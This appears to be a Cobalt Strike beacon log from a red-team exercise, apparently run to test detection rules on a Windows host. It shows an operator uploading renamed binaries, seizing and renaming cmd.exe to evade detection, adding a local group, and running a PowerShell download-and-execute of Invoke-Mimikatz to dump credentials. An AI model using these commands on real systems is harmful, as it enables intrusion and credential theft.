@@ -1,0 +1,287 @@
+02/03 10:33:43 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 600; os: Windows; version: 6.1; beacon arch: x86 (x64)
+02/03 10:38:13 [task] Tasked beacon to run: powershell calc
+02/03 10:38:41 [checkin] host called home, sent: 46 bytes
+02/03 10:41:14 [task] Tasked beacon to make directory c:\RedTeam\
+02/03 10:41:14 [task] cd c:\RedTeam\
+02/03 10:41:15 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\powershell.exe as powershell.exe
+02/03 10:41:15 [indicator] file: 7353f60b1739074eb17c5f4dddefe239 448000 bytes powershell.exe
+02/03 10:41:15 [task] Tasked beacon to run: C:\RedTeam\powershell.exe calc
+02/03 10:41:42 [checkin] host called home, sent: 448125 bytes
+02/03 10:43:52 [output]
+received output:
+拒绝访问。
+
+
+02/03 10:45:46 [task] Tasked beacon to make directory c:\RedTeam\
+02/03 10:45:47 [task] cd c:\RedTeam\
+02/03 10:45:48 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\powershell.exe as powershell.exe
+02/03 10:45:48 [indicator] file: 852d67a27e454bd389fa7f02a8cbe23f 473600 bytes powershell.exe
+02/03 10:45:48 [task] Tasked beacon to run: C:\RedTeam\powershell.exe calc
+02/03 10:45:52 [checkin] host called home, sent: 473725 bytes
+02/03 10:48:40 [task] Tasked beacon to make directory C:\Windows\System32\
+02/03 10:48:40 [task] cd C:\Windows\System32\
+02/03 10:48:41 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\powershell2.exe as powershell2.exe
+02/03 10:48:41 [indicator] file: 852d67a27e454bd389fa7f02a8cbe23f 473600 bytes powershell2.exe
+02/03 10:48:41 [task] Tasked beacon to run: C:\Windows\System32\powershell2.exe calc
+02/03 10:48:52 [checkin] host called home, sent: 473754 bytes
+02/03 10:54:47 [task] Tasked beacon to make directory c:\RedTeam\
+02/03 10:54:47 [task] cd c:\RedTeam\
+02/03 10:54:47 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
+02/03 10:54:47 [indicator] file: 911d039e71583a07320b32bde22f8e22 278528 bytes cmd_back.exe
+02/03 10:54:47 [task] Tasked beacon to run: C:\RedTeam\cmd_back.exe Net Localgroup Tests /add
+02/03 10:54:53 [checkin] host called home, sent: 278670 bytes
+02/03 10:55:02 [output]
+received output:
+拒绝访问。
+
+
+02/03 10:56:27 [task] Tasked beacon to make directory c:\RedTeam\
+02/03 10:56:27 [task] cd c:\RedTeam\
+02/03 10:56:28 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
+02/03 10:56:28 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
+02/03 10:56:28 [task] Tasked beacon to run: C:\RedTeam\cmd_back.exe Net Localgroup Tests /add
+02/03 10:57:02 [checkin] host called home, sent: 345230 bytes
+02/03 10:57:02 [output]
+received output:
+系统无法在消息文件中为 Application 找到消息号为 0x2350 的消息文本。
+
+版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+c:\RedTeam>
+
+02/03 11:05:21 [task] Tasked beacon to make directory c:\RedTeam\
+02/03 11:05:21 [task] cd c:\RedTeam\
+02/03 11:05:22 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
+02/03 11:05:22 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
+02/03 11:05:22 [task] Tasked beacon to run: C:\RedTeam\cmd_back.exe Net Localgroup Tests /add
+02/03 11:06:02 [checkin] host called home, sent: 345230 bytes
+02/03 11:06:03 [output]
+received output:
+系统无法在消息文件中为 Application 找到消息号为 0x2350 的消息文本。
+
+版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+c:\RedTeam>
+
+02/03 11:10:52 [task] Tasked beacon to make directory C:\Windows\System32\
+02/03 11:10:52 [task] cd C:\Windows\System32\
+02/03 11:10:53 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
+02/03 11:10:53 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
+02/03 11:10:53 [task] Tasked beacon to run: C:\Windows\System32\cmd_back.exe Net Localgroup Tests /add
+02/03 11:11:03 [checkin] host called home, sent: 345257 bytes
+02/03 11:11:03 [output]
+received output:
+系统无法在消息文件中为 Application 找到消息号为 0x2350 的消息文本。
+
+版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+C:\Windows\System32>
+
+02/03 11:16:38 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
+02/03 11:16:38 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
+02/03 11:16:38 [task] Tasked beacon to run: rename cmd.exe cmd_back.exe
+02/03 11:16:38 [task] Tasked beacon to run: C:\Windows\System32\cmd_back.exe Net Localgroup Tests /add
+02/03 11:16:38 [task] Tasked beacon to run: rename cmd_back.exe cmd.exe
+02/03 11:17:03 [checkin] host called home, sent: 370 bytes
+02/03 11:17:03 [output]
+received output:
+
+成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。
+
+
+02/03 11:17:03 [output]
+received output:
+已处理的文件: C:\Windows\System32\cmd.exe
+已成功处理 1 个文件; 处理 0 个文件时失败
+
+
+02/03 11:17:03 [output]
+received output:
+存在一个重名文件，或是找不到文件。
+
+
+02/03 11:17:03 [output]
+received output:
+系统无法在消息文件中为 Application 找到消息号为 0x2350 的消息文本。
+
+版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+C:\Windows\System32>
+
+02/03 11:17:03 [output]
+received output:
+存在一个重名文件，或是找不到文件。
+
+
+02/03 11:22:53 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
+02/03 11:22:53 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
+02/03 11:22:53 [task] Tasked beacon to run: rename cmd.exe cmd_back.exe
+02/03 11:22:53 [task] Tasked beacon to run: C:\Windows\System32\cmd_back.exe Net Localgroup Tests /add
+02/03 11:22:53 [task] Tasked beacon to run: rename cmd_back.exe cmd.exe
+02/03 11:23:03 [checkin] host called home, sent: 370 bytes
+02/03 11:23:03 [output]
+received output:
+
+成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。
+
+
+02/03 11:23:03 [output]
+received output:
+已处理的文件: C:\Windows\System32\cmd.exe
+已成功处理 1 个文件; 处理 0 个文件时失败
+
+
+02/03 11:23:03 [output]
+received output:
+存在一个重名文件，或是找不到文件。
+
+
+02/03 11:23:03 [output]
+received output:
+系统无法在消息文件中为 Application 找到消息号为 0x2350 的消息文本。
+
+版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+C:\Windows\System32>
+
+02/03 11:23:03 [output]
+received output:
+存在一个重名文件，或是找不到文件。
+
+
+02/03 11:23:58 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
+02/03 11:24:03 [checkin] host called home, sent: 247 bytes
+02/03 11:24:06 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
+02/03 11:24:06 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
+02/03 11:24:06 [task] Tasked beacon to run: rename cmd.exe cmd_back.exe
+02/03 11:24:06 [task] Tasked beacon to run: C:\Windows\System32\cmd_back.exe Net Localgroup Tests /add
+02/03 11:24:06 [task] Tasked beacon to run: rename cmd_back.exe cmd.exe
+02/03 11:25:14 [checkin] host called home, sent: 370 bytes
+02/03 11:25:14 [output]
+received output:
+使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”
+所在位置 行:1 字符: 46
++ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://raw.githubuserco
+ntent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/
+Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+ 
+无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
+检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
+所在位置 行:1 字符: 202
++ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.
+com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfilt
+ration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
+    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
+   mandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+
+
+02/03 11:25:14 [output]
+received output:
+
+成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。
+
+
+02/03 11:25:14 [output]
+received output:
+已处理的文件: C:\Windows\System32\cmd.exe
+已成功处理 1 个文件; 处理 0 个文件时失败
+
+
+02/03 11:25:14 [output]
+received output:
+存在一个重名文件，或是找不到文件。
+
+
+02/03 11:25:14 [output]
+received output:
+系统无法在消息文件中为 Application 找到消息号为 0x2350 的消息文本。
+
+版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+C:\Windows\System32>
+
+02/03 11:25:14 [output]
+received output:
+存在一个重名文件，或是找不到文件。
+
+
+02/03 11:28:26 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
+02/03 11:28:26 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
+02/03 11:28:26 [task] cd C:\Windows\System32\
+02/03 11:28:26 [task] Tasked beacon to run: rename cmd.exe cmd_back.exe
+02/03 11:28:26 [task] Tasked beacon to run: C:\Windows\System32\cmd_back.exe Net Localgroup Tests /add
+02/03 11:28:26 [task] cd C:\Windows\System32\
+02/03 11:28:26 [task] Tasked beacon to run: rename cmd_back.exe cmd.exe
+02/03 11:29:14 [checkin] host called home, sent: 426 bytes
+02/03 11:29:14 [output]
+received output:
+
+成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。
+
+
+02/03 11:29:14 [output]
+received output:
+已处理的文件: C:\Windows\System32\cmd.exe
+已成功处理 1 个文件; 处理 0 个文件时失败
+
+
+02/03 11:29:14 [output]
+received output:
+存在一个重名文件，或是找不到文件。
+
+
+02/03 11:29:14 [output]
+received output:
+系统无法在消息文件中为 Application 找到消息号为 0x2350 的消息文本。
+
+版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+C:\Windows\System32>
+
+02/03 11:29:14 [output]
+received output:
+存在一个重名文件，或是找不到文件。
+
+
+02/03 11:31:43 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
+02/03 11:31:43 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
+02/03 11:31:43 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe
+02/03 11:31:43 [task] Tasked beacon to run: C:\Windows\System32\cmd_back.exe Net Localgroup Tests /add
+02/03 11:32:14 [checkin] host called home, sent: 350 bytes
+02/03 11:32:15 [output]
+received output:
+
+成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。
+
+
+02/03 11:32:15 [output]
+received output:
+已处理的文件: C:\Windows\System32\cmd.exe
+已成功处理 1 个文件; 处理 0 个文件时失败
+
+
+02/03 11:32:15 [output]
+received output:
+已复制         1 个文件。
+
+
+02/03 11:32:15 [output]
+received output:
+系统无法在消息文件中为 Application 找到消息号为 0x2350 的消息文本。
+
+版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
+系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。
+
+C:\Windows\System32>
+
